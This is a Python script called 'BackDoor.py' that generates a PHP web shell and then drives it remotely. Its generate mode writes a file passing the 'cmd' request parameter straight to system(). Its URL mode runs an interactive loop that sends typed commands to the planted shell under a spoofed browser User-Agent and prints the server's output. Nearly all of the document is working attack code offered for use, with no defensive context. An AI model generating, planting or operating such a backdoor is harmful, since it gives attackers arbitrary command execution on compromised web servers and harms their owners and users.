#!/usr/bin/python3
import urllib.request
from optparse import OptionParser
import urllib.parse
import signal
from  urllib.request import Request


banner= """\33[92m


              _      ______            _       _                  
             | |     | ___ \          | |     | |                 
__      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
\ \ /\ / / _ \ '_ \  | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 \ V  V /  __/ |_) | | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
  \_/\_/ \___|_.__/  \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                                  

\033[93m [ @intx0x80 ]


\33[0 """



parse=OptionParser("""

\33[92m

              _      ______            _       _                  
             | |     | ___ \          | |     | |                 
__      _____| |__   | |_/ / __ _  ___| | ____| | ___   ___  _ __ 
\ \ /\ / / _ \ '_ \  | ___ \/ _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 \ V  V /  __/ |_) | | |_/ / (_| | (__|   < (_| | (_) | (_) | |   
  \_/\_/ \___|_.__/  \____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                                                  
                                                                  
\033[92m
./BackDoor.py [options]
[options]

-u    ,   --url   :         url for uploaded shell
-g    , --generate          generate webshell


 usge                                          
./BackDoor.py -u http://127.0.0.1
./BackDoor.py -g shell
./BackDoor.py --url http://127.0.0.1
./BackDoor.py --generate shell

\033[93m[ @intx0x80 ]
\33[0
""")


def signal_handler(signal, frame):

    print ("\033[91m"+"\n[-] Exiting"+"\033[0m")

    exit()

signal.signal(signal.SIGINT, signal_handler)


parse.add_option("-u","--url",dest="url",type="string",help="shell url ")          
parse.add_option("-g","--generate",dest="gene",type="string",help="shell name")
(opt,args)=parse.parse_args()
if opt.url==None and opt.gene==None:
    print(parse.usage)
    exit(0)
else:
    if opt.gene!=None and opt.url==None :
        print(banner)
        shell_n=str(opt.gene)
        shell=shell_n+".php"
        opfile=open(shell,"+w")
        evil_code="""
<?php
echo system($_GET['cmd']);
?>
"""

        opfile.write(evil_code)
        opfile.close()
        print("\33[93m"+"[ "+shell +"]"+"    is Generated ..."+"\33[0")
    if opt.url!=None and opt.gene==None:
        url=str(opt.url)
        print(banner)
        print("\033[92m"+"Enter q to exit from shell\n"+"\033[92m")
        while True:
            #buff=""
            cmd=str(input("\033[92m"+"$ "+"\033[92m"))
            print("\n")
            if cmd=="q":
                break
            param={"cmd":cmd}
            cmden=urllib.parse.urlencode(param)
            #print(url+"?"+cmden)
            URL=Request(url+"?"+cmden,headers={'User-Agent':'Mozilla/24'})
            openurl=urllib.request.urlopen(URL)
            reponse=str(openurl.read().decode("utf-8"))
            #soup=BeautifulSoup(reponse,"html.parser")
            #for i in soup
            print("\33[95m"+reponse.replace('\\n', '  \n')+"\33[95m")
            #print(soup.get_text())

